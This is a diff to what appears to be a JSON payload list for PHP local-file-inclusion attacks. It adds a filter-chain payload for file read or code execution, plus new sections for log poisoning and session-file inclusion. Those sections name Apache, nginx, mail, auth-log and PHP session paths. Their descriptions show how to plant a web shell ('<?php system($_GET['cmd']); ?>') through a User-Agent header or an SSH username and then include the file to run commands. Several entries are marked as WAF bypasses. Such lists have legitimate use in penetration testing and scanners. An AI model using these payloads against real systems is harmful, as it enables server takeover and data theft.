@@ -45,7 +45,8 @@
         {"payload": "phar://uploads/shell.jpg/test.php", "description": "phar:// wrapper — deserializes PHAR metadata from uploaded file", "waf_bypass": true},
         {"payload": "php://filter/zlib.deflate/convert.base64-encode/resource=index.php", "description": "Chained filters — compress then base64 to bypass size checks", "waf_bypass": true},
         {"payload": "zip://uploads/shell.jpg%23payload.php", "description": "zip:// wrapper — extract PHP from ZIP disguised as image", "waf_bypass": true},
-        {"payload": "php://filter/convert.iconv.UTF-8.UTF-7/resource=index.php", "description": "iconv filter chain — alternative encoding to bypass filters", "waf_bypass": true}
+        {"payload": "php://filter/convert.iconv.UTF-8.UTF-7/resource=index.php", "description": "iconv filter chain — alternative encoding to bypass filters", "waf_bypass": true},
+        {"payload": "php://filter/convert.iconv.UTF-8.CSISO2022KR/resource=index.php", "description": "iconv CSISO2022KR filter chain — used in php_filter_chain_generator for arbitrary file read/RCE", "waf_bypass": true}
       ]
     },
     "null_byte": {
@@ -69,6 +70,25 @@
         {"payload": "..%e0%80%af..%e0%80%af..%e0%80%afetc/passwd", "description": "UTF-8 overlong 3-byte encoding of slash", "waf_bypass": true},
         {"payload": "..0x2f..0x2f..0x2fetc/passwd", "description": "Hex-encoded slash — bypasses regex-based filters", "waf_bypass": true},
         {"payload": "....SLASH....SLASH....SLASHetc/passwd", "description": "Placeholder — replace SLASH with target-specific separator", "waf_bypass": true}
+      ]
+    },
+    "log_poisoning": {
+      "description": "LFI-to-RCE via log file inclusion — inject PHP code in log entries then include the log file",
+      "payloads": [
+        {"payload": "../../../../../../var/log/apache2/access.log", "description": "Apache access log — poison by sending request with PHP payload in User-Agent header", "waf_bypass": false},
+        {"payload": "../../../../../../var/log/nginx/access.log", "description": "Nginx access log — inject PHP via User-Agent: <?php system($_GET['cmd']); ?>", "waf_bypass": false},
+        {"payload": "../../../../../../var/log/nginx/error.log", "description": "Nginx error log — trigger error with PHP payload in request path", "waf_bypass": false},
+        {"payload": "../../../../../../var/log/mail.log", "description": "Mail log poisoning — send email with PHP code in RCPT TO or subject field", "waf_bypass": false},
+        {"payload": "../../../../../../var/log/auth.log", "description": "SSH auth log — inject PHP via failed SSH login: ssh '<?php system($_GET[c]); ?>'@target", "waf_bypass": false}
+      ]
+    },
+    "session_inclusion": {
+      "description": "PHP session file LFI — include session files containing attacker-controlled data for RCE",
+      "payloads": [
+        {"payload": "../../../../../../var/lib/php/sessions/sess_PHPSESSID", "description": "PHP session file (Debian/Ubuntu) — replace PHPSESSID with target cookie value, poison session data first", "waf_bypass": false},
+        {"payload": "../../../../../../tmp/sess_PHPSESSID", "description": "PHP session file (/tmp default) — inject PHP code via session variable then include", "waf_bypass": false},
+        {"payload": "../../../../../../var/lib/php5/sess_PHPSESSID", "description": "PHP5 session path (older Debian) — check phpinfo() for session.save_path", "waf_bypass": false},
+        {"payload": "../../../../../../var/lib/php/sess_PHPSESSID", "description": "Alternative PHP session path — varies by distro and PHP version", "waf_bypass": false}
       ]
     }
   }
